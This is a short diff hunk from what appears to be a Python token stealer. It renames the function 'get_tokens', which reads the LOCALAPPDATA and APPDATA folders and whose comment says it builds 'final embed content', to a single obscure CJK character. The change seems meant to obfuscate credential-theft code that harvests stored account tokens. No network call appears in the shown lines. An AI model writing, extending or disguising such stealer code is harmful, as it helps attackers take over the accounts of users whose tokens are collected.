@@ -84,7 +84,7 @@ def find_tokens(path):
 
 
 # main function - defines paths and returns final embed content
-def get_tokens():
+def 隱():
     local = getenv("LOCALAPPDATA")
     roaming = getenv("APPDATA")
 
